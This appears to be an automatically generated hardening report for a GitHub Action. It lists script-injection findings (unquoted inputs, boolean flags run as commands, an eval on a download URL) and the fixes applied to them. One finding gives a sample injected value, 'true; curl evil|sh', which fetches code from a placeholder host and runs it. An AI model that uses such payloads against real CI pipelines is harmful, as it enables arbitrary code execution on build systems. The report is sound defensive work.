<!-- markdownlint-disable -->

# Hardening Report: FirelyTeam--firely-terminal-pipeline/v0.10.2

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **FirelyTeam--firely-terminal-pipeline/v0.10.2** was hardened automatically. 10 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (b): boolean inputs are expanded unquoted and executed as shell commands. Almost every step (about 25) uses the pattern `if $INPUT_DOTNET_VALIDATION_ENABLED; then` (also $INPUT_TERMINOLOGY_SERVICE_BFARM_ENABLED, $INPUT_JAVA_VALIDATION_ENABLED, $INPUT_SUSHI_ENABLED, $INPUT_SUSHI_USE_CONFIG_DEPENDENCIES, $INPUT_JAVA_SNAPSHOT_ENABLED, $CLOSE_SLICING_FOR_VALIDATION). The value of inputs.* is run as a command, so a caller passing e.g. `true; curl evil|sh` gets arbitrary code run. Fix: compare quoted strings instead, e.g. `if [[ "$INPUT_DOTNET_VALIDATION_ENABLED" == "true" ]]`.

Locations:

- `action.yml:90`
- `action.yml:105`
- `action.yml:116`
- `action.yml:131`
- `action.yml:142`
- `action.yml:168`
- `action.yml:287`
- `action.yml:355`
- `action.yml:490`
- `action.yml:504`
- `action.yml:822`

### script-injection (severity: high)

Rule (b), step 'Install Firely.Terminal': `dotnet tool install --global Firely.Terminal --version $FIRELY_TERMINAL_VERSION > /dev/null`. FIRELY_TERMINAL_VERSION comes from inputs.FIRELY_TERMINAL_VERSION and is expanded unquoted.

Locations:

- `action.yml:119`

### script-injection (severity: high)

Rule (b), step 'Simplifier login': `fhir login email=$INPUT_SIMPLIFIER_USERNAME password=$INPUT_SIMPLIFIER_PASSWORD`. Both values come from inputs and are expanded unquoted.

Locations:

- `action.yml:143`

### script-injection (severity: high)

Rule (b), step 'Install fsh-sushi': `sudo npm install -g fsh-sushi@$SUSHI_VERSION` (from inputs.SUSHI_VERSION, unquoted). The same step also has `sudo chown -R $USER ...`, where $USER is unquoted.

Locations:

- `action.yml:506`

### script-injection (severity: high)

Rule (b), steps 'Generate conformance resources with SUSHI' and 'Re-run SUSHI...': `sushi $INPUT_SUSHI_OPTIONS`. inputs.SUSHI_OPTIONS is expanded unquoted.

Locations:

- `action.yml:517`
- `action.yml:824`

### script-injection (severity: high)

Rule (b), step 'Run Quality Control checks': `if echo $INPUT_EXPECTED_FAILS | grep ...`, `fhir check $INPUT_PATH_TO_QUALITY_CONTROL_RULES` and `fhir check --fail $INPUT_PATH_TO_QUALITY_CONTROL_RULES`. All are input-derived values expanded unquoted.

Locations:

- `action.yml:600`

### script-injection (severity: high)

Rule (b), step 'Remove package cache...': `rm -rf $fhirCacheLocation`. The command output is expanded unquoted inside a step gated by an unquoted input that is executed as a command.

Locations:

- `action.yml:633`

### script-injection (severity: high)

Rule (b), step 'Download Java Validator': `JAVA_VALIDATOR_DOWNLOAD_LOCATION=$(eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION")` runs inputs.JAVA_VALIDATOR_DOWNLOAD_LOCATION through eval, so any $(...), backticks or ';' in the input are executed. The step then runs `wget -q $JAVA_VALIDATOR_DOWNLOAD_LOCATION -O validator_cli.jar` with the value unquoted. Fix: replace the eval with a literal substitution, e.g. `${JAVA_VALIDATOR_DOWNLOAD_LOCATION//\$JAVA_VALIDATOR_VERSION/$JAVA_VALIDATOR_VERSION}`, and quote the value.

Locations:

- `action.yml:651`
- `action.yml:654`

### script-injection (severity: high)

Rule (b), step 'Validate all conformance resources in scope of the repository': `for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES;`, `echo $INPUT_EXPECTED_FAILS | grep ...` and `java -jar validator_cli.jar $GITHUB_WORKSPACE/$p*.xml ... -version $FHIR_VERSION $INPUT_JAVA_VALIDATION_OPTIONS $UNESCPAED_IG_DEPENDENCIES $LOCAL_IG_PARAMETERS`. The input-derived values (inputs.PATH_TO_CONFORMANCE_RESOURCES, EXPECTED_FAILS, JAVA_VALIDATION_OPTIONS, env.FHIR_VERSION) are expanded unquoted.

Locations:

- `action.yml:680`
- `action.yml:708`

### script-injection (severity: high)

Rule (b), step 'Validate all example resources in scope of the repository': `for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES;`, `for p in $PATH_TO_EXAMPLES;`, `echo $INPUT_EXPECTED_FAILS | grep ...` and `java -jar validator_cli.jar ... -version $FHIR_VERSION $INPUT_JAVA_VALIDATION_OPTIONS $UNESCPAED_IG_DEPENDENCIES $COMBINED_IG_PARAMETERS`. All are unquoted expansions of input-derived data.

Locations:

- `action.yml:757`
- `action.yml:780`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection

**Notes:**

All changes are in action.yml.
- Boolean inputs: every `if $FLAG; then` (and the `&&`/`||` forms) now compares as a string, e.g. `[[ "$FLAG" == "true" ]]`. Flags covered: DOTNET, JAVA, SUSHI, SUSHI_USE_CONFIG_DEPENDENCIES, JAVA_SNAPSHOT, BFARM, CLOSE_SLICING.
- Single values are now quoted: FIRELY_TERMINAL_VERSION, the login email and password, "$USER", "fsh-sushi@$SUSHI_VERSION", "$fhirCacheLocation", "$FHIR_VERSION" and "$FHIR_RESTORE".
- PATH_TO_QUALITY_CONTROL_RULES is optional, so it uses ${VAR:+"$VAR"}: an empty value still adds no argument.
- EXPECTED_FAILS is now read with `printf '%s\n' "$X" | grep -w`.
- Download Java Validator: removed the eval. The URL template now has `$JAVA_VALIDATOR_VERSION` and `${JAVA_VALIDATOR_VERSION}` replaced as plain text, and the wget URL is quoted.
- List inputs (SUSHI_OPTIONS, PATH_TO_CONFORMANCE_RESOURCES, PATH_TO_EXAMPLES, JAVA_VALIDATION_OPTIONS, and the IG dependency string built inside the step) are now bash arrays assigned unquoted, e.g. `arr=($VAR)`. That splits on whitespace and expands globs exactly as upstream's unquoted use did, and nothing in the value gets run.
- The -ig parameter lists are now built as arrays, and the `*.xml`/`*.json` globs keep the folder part quoted and only the wildcard unquoted.
- Side effect: the scan won't be fully clean on these. The unquoted array assignments may still be flagged, and they are the exact match for upstream's behaviour. Also, a flag value spelled any other way than lowercase `true` (e.g. `True`) now counts as false. Upstream treated those as false too, because the shell just failed to find a command by that name.

